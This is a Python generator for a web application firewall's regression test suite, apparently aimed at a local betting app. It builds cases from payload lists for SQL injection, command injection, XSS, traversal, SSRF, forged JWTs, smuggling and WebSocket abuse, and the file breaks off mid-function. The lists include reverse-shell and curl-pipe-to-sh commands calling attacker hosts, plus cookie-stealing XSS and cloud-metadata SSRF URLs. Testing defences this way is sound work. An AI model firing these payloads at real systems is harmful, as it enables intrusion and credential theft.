#!/usr/bin/env python3
"""
generate.py — Aegis-Gate round-2 regression test-set generator.

ONE-TIME AUTHORING TOOL. It expands hand-written seed payload banks (plus the
teammate WebSocket dataset) into per-class JSON case files under ../cases/.
The generated cases/ tree is committed, so the bash runner (run.sh) needs
nothing but curl + jq at run time — Python is only required to *regenerate*.

Case schema (one object; files are arrays of these):
{
  "id":          "sqli-0007",
  "class":       "injection-sqli",          # == folder name
  "name":        "short label",
  "description": "what this probes",
  "severity":    "low|medium|high|critical",
  "source":      "seed|generated|teammate-ws-dataset|hk-round-1",
  "tags":        ["evasion:double-urlencode", ...],
  "request": {
     "method":  "GET|POST|PUT|OPTIONS|PROPFIND|...",
     "path":    "/api/...?q=...",   # literal request-target, attacker-encoded, sent --path-as-is
     "headers": {"Header": "value", ...},
     "auth":    "none|session",      # session => runner logs in (alice) and adds sid cookie
     "body":    "<raw string>" | null,
     "body_b64": false,              # true => body is base64 (binary / gzip / multipart)
     "execute":  true                # false => informational (e.g. DoS pattern, server->client frame)
  },
  "ws": {                            # optional, present only for WS frame cases
     "handshake_path":   "/ws/live",
     "handshake_headers":{...},
     "frames": [ {"opcode":"text|binary|ping|close","payload_b64":"..."} ],
     "handshake_only": false
  },
  "expect": { "verdict": "allow|block|challenge", "rule_id_contains": ["sqli"] }
}
"""
import base64, gzip, io, json, os, random, urllib.parse as U

random.seed(20260613)                       # deterministic output
HERE = os.path.dirname(os.path.abspath(__file__))
CASES = os.path.normpath(os.path.join(HERE, "..", "cases"))
WS_DATASET = os.path.normpath(os.path.join(HERE, "..", "..", "websocket_attack_samples.json"))

HOST = "localhost:8080"
ORIGIN_GOOD = "http://localhost:8080"
ORIGIN_EVIL = "https://attacker.evil.com:8080"

# realistic browser headers reused by benign traffic
UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
def browser_headers(extra=None):
    h = {"User-Agent": UA, "Accept": "application/json, text/plain, */*",
         "Accept-Language": "en-US,en;q=0.9", "Referer": ORIGIN_GOOD + "/"}
    if extra: h.update(extra)
    return h

_counter = {}
def cid(cls):
    n = _counter.get(cls, 0) + 1; _counter[cls] = n
    return f"{cls.split('-')[-1]}-{n:04d}"

bucket = {}                                  # class -> [cases]
def add(cls, name, desc, request, verdict, severity="high",
        source="generated", tags=None, ws=None, rule=None):
    request.setdefault("auth", "none")
    request.setdefault("headers", {})
    request.setdefault("body", None)
    request.setdefault("body_b64", False)
    request.setdefault("execute", True)
    c = {"id": cid(cls), "class": cls, "name": name, "description": desc,
         "severity": severity, "source": source, "tags": tags or [],
         "request": request, "expect": {"verdict": verdict}}
    if rule: c["expect"]["rule_id_contains"] = rule
    if ws: c["ws"] = ws
    bucket.setdefault(cls, []).append(c)

# ---------------------------------------------------------------- obfuscation
def url1(s):  return U.quote(s, safe="")
def url2(s):  return U.quote(U.quote(s, safe=""), safe="")
def mixcase(s):
    return "".join(ch.upper() if i % 2 else ch.lower() for i, ch in enumerate(s))
def sqlcomment(s): return s.replace(" ", "/**/")
def nullbyte(s):   return s + "%00"
def unicode_dots(s): return s.replace(".", ".")
OBF = {
    "raw": lambda s: s,
    "urlencode": url1,
    "double-urlencode": url2,
    "mixed-case": mixcase,
    "sql-comment": sqlcomment,
    "nullbyte-suffix": nullbyte,
}

# ================================================================ SQLi
SQLI = [
    "' OR '1'='1", "' OR 1=1--", "admin'--", "' OR 1=1#", "') OR ('1'='1",
    "1' UNION SELECT username,password FROM users--",
    "1 UNION SELECT card_number,ssn FROM users",
    "'; DROP TABLE transactions;--", "' AND SLEEP(5)--", "1 AND 1=CONVERT(int,@@version)",
    "' OR '1'='1' /*", "1' ORDER BY 8--", "' UNION ALL SELECT NULL,NULL,NULL--",
    "1) OR SLEEP(5)#", "' OR pg_sleep(5)--", "1;WAITFOR DELAY '0:0:5'--",
    "' OR 1=1 LIMIT 1 OFFSET 1--", "%27%20OR%201%3D1--",
    "' UNION SELECT @@version,2,3--", "0x27206f7220313d31",
    "' OR 'x'='x' AND email IS NOT NULL--", "1' AND extractvalue(1,concat(0x7e,version()))--",
]
# injectable real targets (param, how to inject)
SQLI_TARGETS = [
    ("GET", "/api/transactions?page={p}", "query:page", "session"),
    ("GET", "/api/transactions?limit={p}", "query:limit", "session"),
    ("GET", "/game/{p}", "path:id", "none"),
    ("GET", "/game/1?name={p}", "query:name", "none"),
    ("POST", "/login", "body:username", "none"),
]
def gen_sqli():
    obfs = ["raw", "urlencode", "mixed-case", "sql-comment", "double-urlencode"]
    for pl in SQLI:
        for (m, tmpl, where, auth) in SQLI_TARGETS:
            ob = random.choice(obfs)
            payload = OBF[ob](pl)
            if tmpl.endswith("{p}") or "{p}" in tmpl and where.startswith(("query", "path")):
                path = tmpl.format(p=payload if where.startswith("query") else url1(payload))
                body = None
            if where.startswith("body"):
                path = tmpl
                body = json.dumps({"username": pl, "password": "x"})
            else:
                path = tmpl.format(p=payload)
                body = None
            req = {"method": m, "path": path, "auth": auth,
                   "headers": browser_headers({"Content-Type": "application/json"} if body else None),
                   "body": body}
            add("injection-sqli", f"SQLi {where} [{ob}]",
                f"SQL injection via {where} on {tmpl}: {pl[:40]}", req, "block",
                severity="high", source="seed", tags=[f"evasion:{ob}", "owasp:A03"],
                rule=["sqli"])
gen_sqli()

# ================================================================ Command injection
CMDI = [
    "; id", "| id", "|| id", "& whoami", "&& cat /etc/passwd", "`id`", "$(id)",
    "; cat /etc/passwd", "; ls -la /", "| nc 10.0.0.1 4444 -e /bin/sh",
    "; curl http://attacker.evil.com/x | sh", "%0a/bin/cat%20/etc/passwd",
    ";`reboot`", "$(wget http://14.46.136.77/sh)", "; ping -c 10 127.0.0.1",
    "|| sleep 5", "; python -c 'import os;os.system(\"id\")'", "; busybox wget http://x/s",
    "`curl -sk https://14.46.136.77/sh|sh`",
]
CMDI_TARGETS = [
    ("GET", "/game/1?name={p}", "query:name", "none"),
    ("POST", "/api/feedback", "body:comment", "none"),
    ("POST", "/api/bet-reports/export", "body:format", "session"),
    ("GET", "/cgi-bin/{p}", "path", "none"),       # classic shellshock-ish target
]
def gen_cmdi():
    obfs = ["raw", "urlencode", "double-urlencode", "nullbyte-suffix"]
    for pl in CMDI:
        for (m, tmpl, where, auth) in CMDI_TARGETS:
            ob = random.choice(obfs)
            p = OBF[ob](pl)
            body = None; hdr = browser_headers()
            if where.startswith("body"):
                field = where.split(":")[1]; path = tmpl
                body = json.dumps({field: pl}); hdr = browser_headers({"Content-Type": "application/json"})
            elif where == "path":
                path = tmpl.format(p=url1(pl))
            else:
                path = tmpl.format(p=p)
            req = {"method": m, "path": path, "auth": auth, "headers": hdr, "body": body}
            add("injection-cmdi", f"CmdInjection {where} [{ob}]",
                f"OS command injection via {where}: {pl[:40]}", req, "block",
                severity="critical", source="seed", tags=[f"evasion:{ob}", "owasp:A03"],
                rule=["command_injection"])
gen_cmdi()

# ================================================================ NoSQL injection
NOSQL = [
    '{"$gt":""}', '{"$ne":null}', '{"$ne":1}', '{"$regex":".*"}', '{"$where":"1==1"}',
    '{"$gt":"","$lt":"~"}', '{"username":{"$ne":null},"password":{"$ne":null}}',
    '{"$or":[{},{"a":"a"}]}', '{"$exists":true}', "[$ne]=1",
    '{"$gt":""}; return true', '{"$regex":"^admin"}',
]
def gen_nosql():
    obfs = ["raw", "urlencode"]
    for pl in NOSQL:
        # body-based on /login (username) and /otp
        ob = random.choice(obfs)
        for ep, field in [("/login", "username"), ("/login", "password"), ("/otp", "otp_code")]:
            try:
                inj = json.loads(pl); body = json.dumps({field: inj, "password": "x"} if field != "password" else {"username": "alice", "password": inj})
            except Exception:
                body = json.dumps({field: pl})
            req = {"method": "POST", "path": ep, "auth": "none",
                   "headers": browser_headers({"Content-Type": "application/json"}), "body": body}
            add("injection-nosql", f"NoSQLi {field} operator",
                f"NoSQL operator injection in {field} on {ep}: {pl[:40]}", req, "block",
                severity="high", source="seed", tags=[f"evasion:{ob}", "owasp:A03"],
                rule=["nosql"])
        # query-param variant
        path = "/api/transactions?page[$ne]=1"
        add("injection-nosql", "NoSQLi query bracket operator",
            "NoSQL operator smuggled through bracket query param",
            {"method": "GET", "path": path, "auth": "session", "headers": browser_headers()},
            "block", severity="medium", source="seed", tags=["owasp:A03"], rule=["nosql"])
gen_nosql()

# ================================================================ XSS
XSS = [
    "<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>",
    "\"><script>alert(document.cookie)</script>", "javascript:alert(1)",
    "<body onload=alert(1)>", "<iframe src=javascript:alert(1)>",
    "<a href=\"javascript:alert(1)\">x</a>", "'-alert(1)-'", "</script><script>alert(1)</script>",
    "<img src=x onerror=fetch('//evil/'+document.cookie)>", "<details open ontoggle=alert(1)>",
    "<svg><animate onbegin=alert(1)>", "<marquee onstart=alert(1)>",
    "<input autofocus onfocus=alert(1)>", "<video><source onerror=alert(1)>",
    "<script>eval(atob('YWxlcnQoMSk='))</script>", "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<IMG SRC=`javascript:alert(1)`>", "<svg/onload=alert`1`>",
]
XSS_TARGETS = [
    ("GET", "/game/1?name={p}", "query:name", "none"),     # reflected (welcome msg)
    ("POST", "/api/feedback", "body:comment", "none"),     # stored (stored_xss_active flag)
    ("PUT", "/api/profile", "body:display_name", "session"),
    ("PUT", "/user/settings", "body:preferences", "session"),
]
def gen_xss():
    obfs = ["raw", "urlencode", "double-urlencode", "mixed-case"]
    for pl in XSS:
        for (m, tmpl, where, auth) in XSS_TARGETS:
            ob = random.choice(obfs)
            body = None; hdr = browser_headers()
            if where.startswith("body"):
                field = where.split(":")[1]; path = tmpl
                val = {"preferences": {"notifications": pl}} if field == "preferences" else {field: pl}
                body = json.dumps(val); hdr = browser_headers({"Content-Type": "application/json"})
            else:
                path = tmpl.format(p=OBF[ob](pl))
            req = {"method": m, "path": path, "auth": auth, "headers": hdr, "body": body}
            add("xss", f"XSS {where} [{ob}]", f"Cross-site scripting via {where}: {pl[:40]}",
                req, "block", severity="high", source="seed",
                tags=[f"evasion:{ob}", "owasp:A03"], rule=["xss"])
gen_xss()

# ================================================================ Path traversal / LFI
TRAV = [
    "../../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd", "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "..\\..\\..\\windows\\win.ini",
    "/etc/passwd%00.png", "..%c0%af..%c0%af..%c0%afetc/passwd",
    "....\\\\....\\\\....\\\\etc/passwd", "file:///etc/passwd",
    "../../../../../../proc/self/environ", "..%2F..%2F..%2F.env",
    ".%2e/.%2e/.%2e/.%2e/etc/passwd", "%2e%2e/%2e%2e/%2e%2e/.env",
    "../../app/config/dev.yaml", "..;/..;/..;/etc/passwd",
]
TRAV_TARGETS = ["/static/{p}", "/public/{p}", "/assets/{p}"]
def gen_trav():
    for pl in TRAV:
        for tmpl in TRAV_TARGETS:
            path = tmpl.format(p=pl)
            add("path-traversal", "Path traversal / LFI",
                f"Directory traversal on {tmpl}: {pl[:40]}",
                {"method": "GET", "path": path, "auth": "none", "headers": browser_headers()},
                "block", severity="high", source="seed",
                tags=["owasp:A01", "lfi"], rule=["path_traversal"])
    # the exact round-1 cgi-bin shapes (regression of what committee already sent)
    for p in ["/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh",
              "/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/bin/sh",
              "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"]:
        add("path-traversal", "Round-1 traversal regression",
            f"Replay of committee round-1 traversal/RCE probe: {p}",
            {"method": "POST", "path": p, "auth": "none",
             "headers": {"User-Agent": "libredtail-http", "Content-Type": "text/plain"},
             "body": "id"}, "block", severity="high", source="hk-round-1",
            tags=["regression"], rule=["path_traversal"])
gen_trav()

# ================================================================ SSRF
SSRF = [
    "http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:9443/admin",
    "http://localhost:6379/", "http://[::1]:8080/__control/state",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/", "file:///etc/passwd",
    "gopher://127.0.0.1:6379/_FLUSHALL", "dict://127.0.0.1:11211/stats",
    "http://0x7f000001/", "http://2130706433/", "http://127.0.0.1.nip.io/",
    "http://attacker.evil.com/collect", "http://sec-team.waf-exams.info@evil.com/",
    "https://assets.sec-team.waf-exams.info.evil.com/x", "http://localhost%2523@evil.com/",
]
def gen_ssrf():
    for pl in SSRF:
        # /api/integrations/preview (url field, has allowlist) and /game/{id}/play (callback_url)
        add("ssrf", "SSRF via integrations preview url",
            f"Server-side request forgery through preview url: {pl[:50]}",
            {"method": "POST", "path": "/api/integrations/preview", "auth": "none",
             "headers": browser_headers({"Content-Type": "application/json"}),
             "body": json.dumps({"url": pl})}, "block", severity="high",
            source="seed", tags=["owasp:A10"], rule=["ssrf"])
        add("ssrf", "SSRF via game callback_url",
            f"SSRF through game-result callback_url: {pl[:50]}",
            {"method": "POST", "path": "/game/1/play", "auth": "session",
             "headers": browser_headers({"Content-Type": "application/json"}),
             "body": json.dumps({"bet": 10, "callback_url": pl})}, "block",
            severity="high", source="seed", tags=["owasp:A10"], rule=["ssrf"])
gen_ssrf()

# ================================================================ Auth / JWT
def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
def jwt(header, payload, sig="sig"):
    return f"{b64u(json.dumps(header))}.{b64u(json.dumps(payload))}.{sig}"
NOW = 1789000000
def gen_jwt():
    protected = ["/api/profile", "/admin/users", "/admin/dashboard", "/deposit"]
    bad = [
        ("alg-none", {"alg": "none", "typ": "JWT"}, {"sub": "alice", "role": "admin", "exp": NOW + 9999}, ""),
        ("alg-none-upper", {"alg": "NONE"}, {"sub": "admin", "role": "admin"}, ""),
        ("alg-none-mixed", {"alg": "nOnE"}, {"sub": "admin"}, ""),
        ("expired", {"alg": "HS256"}, {"sub": "alice", "exp": NOW - 100000}, "deadbeef"),
        ("not-before", {"alg": "HS256"}, {"sub": "alice", "nbf": NOW + 100000, "exp": NOW + 200000}, "x"),
        ("wrong-issuer", {"alg": "HS256"}, {"sub": "alice", "iss": "https://evil.com", "exp": NOW + 9999}, "x"),
        ("wrong-audience", {"alg": "HS256"}, {"sub": "alice", "aud": "attacker", "exp": NOW + 9999}, "x"),
        ("forged-sig", {"alg": "HS256"}, {"sub": "admin", "role": "admin", "exp": NOW + 9999}, b64u("forged")),
        ("alg-confusion-rs256", {"alg": "RS256"}, {"sub": "admin", "role": "admin"}, "AAAA"),
        ("kid-sqli", {"alg": "HS256", "kid": "1' OR '1'='1"}, {"sub": "alice"}, "x"),
        ("kid-path", {"alg": "HS256", "kid": "../../../dev/null"}, {"sub": "alice"}, "x"),
        ("jku-ssrf", {"alg": "RS256", "jku": "http://169.254.169.254/"}, {"sub": "alice"}, "x"),
        ("empty-sig", {"alg": "HS256"}, {"sub": "alice", "exp": NOW + 9999}, ""),
        ("privilege-claim", {"alg": "HS256"}, {"sub": "alice", "role": "superadmin", "is_admin": True}, "x"),
    ]
    for (label, hdr, pl, sig) in bad:
        for ep in protected:
            tok = jwt(hdr, pl, sig)
            add("auth-jwt", f"JWT {label}",
                f"Forged/invalid JWT ({label}) presented as Bearer on {ep}",
                {"method": "GET" if ep != "/deposit" else "POST", "path": ep, "auth": "none",
                 "headers": browser_headers({"Authorization": "Bearer " + tok,
                                             **({"Content-Type": "application/json"} if ep == "/deposit" else {})}),
                 "body": json.dumps({"amount": 1, "currency": "USD"}) if ep == "/deposit" else None},
                "block", severity="critical", source="seed",
                tags=["owasp:A07", f"jwt:{label}"], rule=["jwt"])
    # oversized token (DoS-ish) and garbage token
    add("auth-jwt", "JWT oversized token",
        "Multi-kilobyte bogus Bearer token (parser stress / smuggling)",
        {"method": "GET", "path": "/api/profile", "auth": "none",
         "headers": browser_headers({"Authorization": "Bearer " + jwt({"alg": "HS256"}, {"sub": "a", "pad": "A" * 6000})})},
        "block", severity="medium", source="seed", tags=["jwt:oversize"], rule=["jwt"])
    add("auth-jwt", "JWT malformed (two segments)",
        "Structurally malformed Bearer token (missing signature segment)",
        {"method": "GET", "path": "/api/profile", "auth": "none",
         "headers": browser_headers({"Authorization": "Bearer abc.def"})},
        "block", severity="low", source="seed", tags=["jwt:malformed"], rule=["jwt"])
    # BENIGN well-formed bearer (FP check — WAF JWT detector must NOT block a clean token)
    for i, sub in enumerate(["alice", "bob", "charlie"]):
        tok = jwt({"alg": "HS256", "typ": "JWT"},
                  {"sub": sub, "iss": "https://localhost:8080", "aud": "novabet",
                   "iat": NOW - 60, "exp": NOW + 1800}, b64u(f"validlooking{i}"))
        add("auth-jwt", "Benign well-formed JWT (FP check)",
            "Structurally valid, unexpired Bearer token — WAF must not block on shape alone",
            {"method": "GET", "path": "/api/public/stats", "auth": "none",
             "headers": browser_headers({"Authorization": "Bearer " + tok})},
            "allow", severity="low", source="seed", tags=["fp-check", "jwt:benign"])
gen_jwt()

# ================================================================ Caching
def gen_cache():
    # cache poisoning via unkeyed headers
    poison_headers = [
        {"X-Forwarded-Host": "evil.com"}, {"X-Forwarded-Scheme": "nothttps"},
        {"X-Host": "evil.com"}, {"X-Forwarded-Server": "evil.com"},
        {"X-Original-URL": "/admin/users"}, {"X-Rewrite-URL": "/admin/dashboard"},
        {"X-Forwarded-Host": "evil.com", "X-Forwarded-Port": "1337"},
        {"Forwarded": "host=evil.com"},
    ]
    for h in poison_headers:
        add("caching", "Web cache poisoning (unkeyed header)",
            f"Cache poisoning probe with unkeyed header {list(h)[0]}",
            {"method": "GET", "path": "/static/js/app.js", "auth": "none",
             "headers": browser_headers(h)}, "block", severity="high",
            source="seed", tags=["cache-poison", "owasp:A05"], rule=["cache"])
    # cache deception — make authed/dynamic content look like a static asset
    for p in ["/api/profile/nonexistent.css", "/api/profile;.css", "/api/profile%0a.css",
              "/api/profile/..%2fapp.js", "/admin/users.css", "/api/transactions/x.js",
              "/api/profile%00.css", "/deposit/.css"]:
        add("caching", "Cache deception (path confusion)",
            f"Cache deception: trick edge cache into storing authed response as static: {p}",
            {"method": "GET", "path": p, "auth": "session", "headers": browser_headers()},
            "block", severity="high", source="seed", tags=["cache-deception"], rule=["cache"])
    # cache key normalization / param cloaking
    for p in ["/static/css/style.css?utm_source=evil&callback=alert",
              "/static/js/app.js?;x=1", "/static/js/app.js%23/../../admin"]:
        add("caching", "Cache key manipulation",
            f"Cache-key confusion / param cloaking: {p}",
            {"method": "GET", "path": p, "auth": "none", "headers": browser_headers()},
            "block", severity="medium", source="seed", tags=["cache-poison"], rule=["cache"])
    # BENIGN caching (FP checks — normal asset fetches with conditional headers)
    benign_assets = ["/static/js/app.js", "/static/css/style.css", "/assets/logo.png",
                     "/public/terms.html", "/public/faq.html", "/sitemap.xml", "/favicon.ico"]
    for a in benign_assets:
        add("caching", "Benign static asset fetch (FP check)",
            f"Normal cacheable asset request: {a}",
            {"method": "GET", "path": a, "auth": "none", "headers": browser_headers()},
            "allow", severity="low", source="seed", tags=["fp-check"])
        add("caching", "Benign conditional GET (FP check)",
            f"Conditional GET with If-None-Match on {a} (legit 304 revalidation)",
            {"method": "GET", "path": a, "auth": "none",
             "headers": browser_headers({"If-None-Match": '"a1b2c3d4"'})},
            "allow", severity="low", source="seed", tags=["fp-check", "etag"])
gen_cache()

# ================================================================ CORS
def gen_cors():
    # benign preflight from approved partner
    for org in ["https://partner.example.com", "https://affiliate.example.org", ORIGIN_GOOD]:
        add("cors", "Benign CORS preflight (FP check)",
            f"Legit OPTIONS preflight for partner embed from {org}",
            {"method": "OPTIONS", "path": "/api/public/stats", "auth": "none",
             "headers": {"Origin": org, "Access-Control-Request-Method": "GET",
                         "Access-Control-Request-Headers": "content-type"}},
            "allow", severity="low", source="seed", tags=["fp-check", "cors"])
    # malicious origins / CRLF in origin / null origin on credentialed path
    for org, why in [(ORIGIN_EVIL, "evil origin"), ("null", "null origin"),
                     ("http://localhost:8080.evil.com", "suffix-match bypass"),
                     ("https://evil.com%0d%0aSet-Cookie:x=1", "CRLF in Origin"),
                     ("http://localhost.evil.com", "prefix confusion"),
                     ("https://localhost:8080@evil.com", "userinfo confusion"),
                     ("file://", "file scheme origin")]:
        for ep in ["/api/profile", "/api/transactions", "/admin/users"]:
            add("cors", f"CORS abuse ({why}) {ep}",
                f"Cross-origin probe with {why} against credentialed endpoint {ep}",
                {"method": "GET", "path": ep, "auth": "session",
                 "headers": browser_headers({"Origin": org})},
                "block", severity="medium", source="seed", tags=["cors", "owasp:A05"], rule=["cors"])
gen_cors()

# ================================================================ Protocol / smuggling
def gen_protocol():
    # request smuggling (CL.TE / TE.CL) — both headers present
    add("protocol", "HTTP request smuggling CL.TE",
        "Conflicting Content-Length + Transfer-Encoding (CL.TE desync)",
        {"method": "POST", "path": "/api/feedback", "auth": "none",
         "headers": {"Content-Type": "application/json", "Content-Length": "6",
                     "Transfer-Encoding": "chunked"},
         "body": "0\r\n\r\nGET /admin/users HTTP/1.1\r\nHost: localhost\r\n\r\n"},
        "block", severity="critical", source="seed", tags=["smuggling"], rule=["protocol"])
    add("protocol", "HTTP request smuggling TE.CL obfuscated",
        "Obfuscated Transfer-Encoding header to bypass TE parsing",
        {"method": "POST", "path": "/api/feedback", "auth": "none",
         "headers": {"Content-Type": "application/json", "Transfer-Encoding": " chunked",
                     "Transfer-Encoding ": "x"},
         "body": "1\r\nZ\r\n0\r\n\r\n"}, "block", severity="critical",
        source="seed", tags=["smuggling"], rule=["protocol"])
    # CRLF / header injection in path
    for p in ["/game/1?name=foo%0d%0aSet-Cookie:sid=evil",
              "/game/1?name=foo%0d%0aX-Injected:1",
              "/api/notifications/stream%0aX-Injected:evil"]:
        add("protocol", "CRLF / response-splitting",
            f"CRLF injection in request target: {p}",
            {"method": "GET", "path": p, "auth": "none", "headers": browser_headers()},
            "block", severity="high", source="seed", tags=["crlf"], rule=["protocol"])
    # dangerous / unusual methods across several paths
    for m in ["TRACE", "TRACK", "DEBUG", "CONNECT", "PROPFIND", "DELETE", "PATCH", "OPTIONS*"]:
        for tp in ["/", "/api/profile", "/admin/users"]:
            add("protocol", f"Unusual method {m} {tp}",
                f"Unexpected HTTP method {m} on {tp}",
                {"method": m, "path": tp, "auth": "none", "headers": browser_headers()},
                "block", severity="medium", source="seed", tags=["method"], rule=["protocol"])
    # Host header injection / duplicate host / absolute URI
    for h, why in [({"Host": "evil.com"}, "spoofed Host"),
                   ({"Host": "localhost:8080\r\nX-Injected: 1"}, "Host CRLF"),
                   ({"Host": "169.254.169.254"}, "metadata host")]:
        add("protocol", f"Host header abuse ({why})",
            f"Host header manipulation: {why}",
            {"method": "GET", "path": "/api/public/stats", "auth": "none",
             "headers": {**browser_headers(), **h}}, "block", severity="medium",
            source="seed", tags=["host-header"], rule=["protocol"])
    # control-endpoint access attempts (must be blocked from the data plane)
    for p in ["/__control/state", "/__control/reset", "/__control/error_mode", "/__control/slow"]:
        add("protocol", "Control-endpoint access from data plane",
            f"External attempt to reach benchmarking control endpoint {p}",
            {"method": "GET" if p.endswith("state") else "POST", "path": p, "auth": "none",
             "headers": browser_headers({"X-Benchmark-Secret": "guess"}),
             "body": None if p.endswith("state") else "{}"},
            "block", severity="critical", source="seed", tags=["admin-exposure"], rule=["recon"])
    # oversized header / body
    add("protocol", "Oversized request header",
        "Single header value far over normal size (buffer / parser stress)",
        {"method": "GET", "path": "/", "auth": "none",
         "headers": browser_headers({"X-Pad": "A" * 16000})}, "block",
        severity="medium", source="seed", tags=["oversize"], rule=["protocol"])
gen_protocol()

# ================================================================ Rate limit
def gen_ratelimit():
    # burst patterns — executed as repeat-N by the runner (rate-limit class)
    for ep, n, auth in [("/login", 60, "none"), ("/api/feedback", 80, "none"),
                        ("/otp", 50, "none"), ("/game/1", 100, "none"),
                        ("/api/public/stats", 120, "none")]:
        body = json.dumps({"username": "alice", "password": "wrong"}) if ep == "/login" else (
               json.dumps({"login_token": "x", "otp_code": "000000"}) if ep == "/otp" else (
               json.dumps({"comment": "spam"}) if "feedback" in ep else None))
        add("rate-limit", f"Burst on {ep} (x{n})",
            f"Rapid burst of {n} requests to {ep} to trip rate limiter / PoW challenge",
            {"method": "POST" if body else "GET", "path": ep, "auth": auth,
             "headers": browser_headers({"Content-Type": "application/json"} if body else None),
             "body": body},
            "challenge", severity="medium", source="seed",
            tags=["rate-limit", f"repeat:{n}"], rule=["rate_limit"])
    # credential-stuffing style (login many users)
    add("rate-limit", "Credential stuffing burst",
        "Many failed /login attempts across users from one IP",
        {"method": "POST", "path": "/login", "auth": "none",
         "headers": browser_headers({"Content-Type": "application/json"}),
         "body": json.dumps({"username": "alice", "password": "x"})},
        "challenge", severity="high", source="seed",
        tags=["rate-limit", "repeat:100", "cred-stuffing"], rule=["rate_limit"])
gen_ratelimit()

# ================================================================ WebSocket + SSE (crafted + teammate dataset)
def ws_handshake_headers(origin=ORIGIN_GOOD, cookie=None, extra=None):
    h = {"Host": HOST, "Upgrade": "websocket", "Connection": "Upgrade",
         "Sec-WebSocket-Version": "13", "Sec-WebSocket-Key": base64.b64encode(os.urandom(16)).decode(),
         "Origin": origin}
    if cookie: h["Cookie"] = cookie
    if extra: h.update(extra)
    return h

def gen_ws_crafted():
    # benign WS handshake (FP check) — runner sends handshake, WAF must allow upgrade
    add("websocket", "Benign WS handshake (FP check)",
        "Legitimate same-origin authenticated WebSocket upgrade to /ws/live",
        {"method": "GET", "path": "/ws/live", "auth": "session",
         "headers": ws_handshake_headers(origin=ORIGIN_GOOD)}, "allow",
        severity="low", source="seed", tags=["fp-check", "ws-handshake"],
        ws={"handshake_path": "/ws/live", "handshake_only": True,
            "handshake_headers": ws_handshake_headers(origin=ORIGIN_GOOD), "frames": []})
    # benign subscribe frame (FP check)
    add("websocket", "Benign WS subscribe frame (FP check)",
        "Legit subscribe text frame after authenticated upgrade",
        {"method": "GET", "path": "/ws/live", "auth": "session",
         "headers": ws_handshake_headers(origin=ORIGIN_GOOD)}, "allow",
        severity="low", source="seed", tags=["fp-check", "ws-frame"],
        ws={"handshake_path": "/ws/live", "handshake_only": False,
            "handshake_headers": ws_handshake_headers(origin=ORIGIN_GOOD),
            "frames": [{"opcode": "text", "payload_b64": b64u('{"op":"subscribe","topic":"balance"}')}]})
    # CSWSH — cross-site origin handshake (curl can do; WAF blocks at handshake)
    for org in [ORIGIN_EVIL, "https://novabet.attacker.evil.com", "null"]:
        add("websocket", f"CSWSH cross-site origin ({org})",
            f"Cross-site WebSocket hijack: handshake with foreign Origin {org}",
            {"method": "GET", "path": "/ws/live", "auth": "session",
             "headers": ws_handshake_headers(origin=org)}, "block", severity="critical",
            source="seed", tags=["cswsh", "ws-handshake"], rule=["websocket"],
            ws={"handshake_path": "/ws/live", "handshake_only": True,
                "handshake_headers": ws_handshake_headers(origin=org), "frames": []})
    # missing origin / tampered version / bad key
    for label, extra, drop_origin in [
        ("missing-origin", {}, True),
        ("bad-version", {"Sec-WebSocket-Version": "99"}, False),
        ("missing-key", {"Sec-WebSocket-Key": ""}, False),
        ("tcp-tunnel-subproto", {"Sec-WebSocket-Protocol": "vnc"}, False),
    ]:
        hs = ws_handshake_headers(origin=ORIGIN_GOOD, extra=extra)
        if drop_origin: hs.pop("Origin", None)
        add("websocket", f"WS handshake tamper ({label})",
            f"Malformed/abusive WS upgrade: {label}",
            {"method": "GET", "path": "/ws/live", "auth": "none", "headers": hs},
            "block", severity="high", source="seed", tags=["ws-handshake", label],
            rule=["websocket"],
            ws={"handshake_path": "/ws/live", "handshake_only": True,
                "handshake_headers": hs, "frames": []})
    # upgrade on a protected non-WS path (rule bypass attempt)
    for p in ["/api/transactions", "/admin/users", "/deposit"]:
        add("websocket", f"WS upgrade on protected path {p}",
            f"Attempt to bypass HTTP rules by sending Upgrade:websocket to {p}",
            {"method": "GET", "path": p, "auth": "session",
             "headers": ws_handshake_headers(origin=ORIGIN_GOOD)}, "block",
            severity="high", source="seed", tags=["ws-upgrade-bypass"], rule=["websocket"],
            ws={"handshake_path": p, "handshake_only": True,
                "handshake_headers": ws_handshake_headers(origin=ORIGIN_GOOD), "frames": []})
    # host-header SSRF via upgrade
    hs = ws_handshake_headers(origin=ORIGIN_GOOD, extra={"Host": "169.254.169.254"})
    add("websocket", "WS host-header SSRF on upgrade",
        "Internal-host Host header on WS upgrade (SSRF to metadata service)",
        {"method": "GET", "path": "/ws/live", "auth": "session", "headers": hs},
        "block", severity="critical", source="seed", tags=["ws-ssrf"], rule=["websocket"],
        ws={"handshake_path": "/ws/live", "handshake_only": True, "handshake_headers": hs, "frames": []})
    # oversized frame (needs helper) — fail-closed 1009
    big = b64u('{"op":"subscribe","topic":"' + "A" * 200000 + '"}')
    add("websocket", "WS oversized frame (fail-closed)",
        "Single text frame over MAX_FRAME_PAYLOAD ceiling; enforce mode must close 1009",
        {"method": "GET", "path": "/ws/live", "auth": "session",
         "headers": ws_handshake_headers(origin=ORIGIN_GOOD)}, "block", severity="high",
        source="seed", tags=["ws-oversize", "ws-frame"], rule=["websocket"],
        ws={"handshake_path": "/ws/live", "handshake_only": False,
            "handshake_headers": ws_handshake_headers(origin=ORIGIN_GOOD),
            "frames": [{"opcode": "text", "payload_b64": big}]})
gen_ws_crafted()

def gen_sse_crafted():
    # benign SSE (FP check)
    add("sse", "Benign SSE subscribe (FP check)",
        "Legit authenticated same-origin Server-Sent Events stream open",
        {"method": "GET", "path": "/api/notifications/stream", "auth": "session",
         "headers": browser_headers({"Accept": "text/event-stream", "Origin": ORIGIN_GOOD})},
